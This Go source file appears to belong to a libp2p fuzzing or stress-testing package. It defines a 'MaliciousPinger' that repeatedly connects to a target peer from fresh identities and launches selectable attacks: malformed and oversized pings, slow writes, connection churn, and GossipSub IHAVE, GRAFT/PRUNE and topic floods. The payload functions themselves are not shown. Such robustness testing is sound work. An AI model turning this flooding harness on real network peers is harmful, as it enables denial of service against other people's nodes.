package p2pfuzz

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multiaddr"
)

// pingProtocol defines the libp2p ping protocol ID.
const pingProtocol = "/ipfs/ping/1.0.0"

// MaliciousPinger handles sending various types of potentially harmful ping messages.
type MaliciousPinger struct {
	ctx         context.Context
	targetInfo  *peer.AddrInfo
	running     bool
	stopCh      chan struct{}
	attackType  PingAttackType
	concurrency int
	minInterval time.Duration
	maxInterval time.Duration
}

// NewMaliciousPinger creates a new pinger instance targeting the given multiaddress.
func NewMaliciousPinger(ctx context.Context, targetMultiaddr string) (*MaliciousPinger, error) {
	targetAddr, err := multiaddr.NewMultiaddr(targetMultiaddr)
	if err != nil {
		return nil, fmt.Errorf("invalid target multiaddr: %w", err)
	}

	addrInfo, err := peer.AddrInfoFromP2pAddr(targetAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to extract peer info from multiaddr: %w", err)
	}

	return &MaliciousPinger{
		ctx:        ctx,
		targetInfo: addrInfo,
		stopCh:     make(chan struct{}),
		attackType: RandomPayload, // Default attack type
	}, nil
}

// Start begins the ping attack loop in a separate goroutine.
func (mp *MaliciousPinger) Start(attackType PingAttackType, concurrency int, minInterval, maxInterval time.Duration) {
	if mp.running {
		log.Println("Malicious ping is already running")
		return
	}

	mp.running = true
	mp.attackType = attackType
	mp.concurrency = concurrency
	mp.minInterval = minInterval
	mp.maxInterval = maxInterval

	go mp.run()
}

// Stop signals the running attack loop to terminate.
func (mp *MaliciousPinger) Stop() {
	if !mp.running {
		return
	}
	mp.running = false
	mp.stopCh <- struct{}{}
}

// IsRunning returns true if the pinger is actively sending attacks.
func (mp *MaliciousPinger) IsRunning() bool {
	return mp.running
}

// run is the main loop that triggers concurrent attack executions based on the ticker.
func (mp *MaliciousPinger) run() {
	var wg sync.WaitGroup
	ticker := time.NewTicker(mp.minInterval)
	defer ticker.Stop()

	log.Printf("Starting malicious ping attack against %s with attack type %d", mp.targetInfo.ID, mp.attackType)

	for mp.running {
		select {
		case <-mp.ctx.Done():
			mp.running = false
			return
		case <-mp.stopCh:
			return
		case <-ticker.C:
			for i := 0; i < mp.concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					if err := mp.executeAttack(); err != nil {
						log.Printf("Error in ping attack: %v", err)
					}
				}()
			}

			if mp.maxInterval > mp.minInterval {
				nextInterval := mp.minInterval + time.Duration(rand.Int63n(int64(mp.maxInterval-mp.minInterval)))
				ticker.Reset(nextInterval)
			}
		}
	}

	wg.Wait()
	log.Println("Malicious ping attack stopped")
}

// executeAttack creates a new libp2p host, connects to the target, and executes the selected attack type.
func (mp *MaliciousPinger) executeAttack() error {
	priv, _, err := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %v", err)
	}

	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}), // Use NullResourceManager for transient hosts
	)
	if err != nil {
		return fmt.Errorf("failed to create host: %v", err)
	}
	defer h.Close()

	// Initialize PubSub - needed for PubSub attacks
	// We use GossipSubRouter for realistic behavior
	ps, err := pubsub.NewGossipSub(mp.ctx, h)
	if err != nil {
		return fmt.Errorf("failed to create pubsub instance: %v", err)
	}

	if err := h.Connect(mp.ctx, *mp.targetInfo); err != nil {
		// Log connection failures but don't always stop the entire attack
		log.Printf("Failed to connect to target %s: %v", mp.targetInfo.ID, err)
		return nil // Often connection failures are transient, continue the loop
	}

	log.Printf("Connected to target %s for attack", mp.targetInfo.ID)

	switch mp.attackType {
	case RandomPayload:
		return mp.sendRandomPingPayload(h)
	case OversizedPayload:
		return mp.sendOversizedPingPayload(h)
	case EmptyPayload:
		return mp.sendEmptyPingPayload(h)
	case MultipleStreams:
		return mp.openMultiplePingStreams(h)
	case IncompleteWrite:
		return mp.sendIncompletePingPayload(h)
	case PingBarrage:
		return mp.sendPingBarrage(h)
	case MalformedPayload:
		return mp.sendMalformedPayload(h)
	case ConnectDisconnect:
		return mp.performConnectDisconnect(h)
	case VariablePayload:
		return mp.sendVariablePayload(h)
	case SlowWrite:
		return mp.performSlowWrite(h)
	case PubSubIHaveSpam:
		return mp.sendPubSubIHaveSpam(h, ps)
	case PubSubGraftPruneSpam:
		return mp.sendPubSubGraftPruneSpam(h, ps)
	case PubSubMalformedMsg:
		return mp.sendPubSubMalformedMsg(h, ps)
	case PubSubTopicFlood:
		return mp.sendPubSubTopicFlood(h, ps)
	default:
		log.Printf("Unknown attack type %d, defaulting to random payload", mp.attackType)
		return mp.sendRandomPingPayload(h)
	}
}
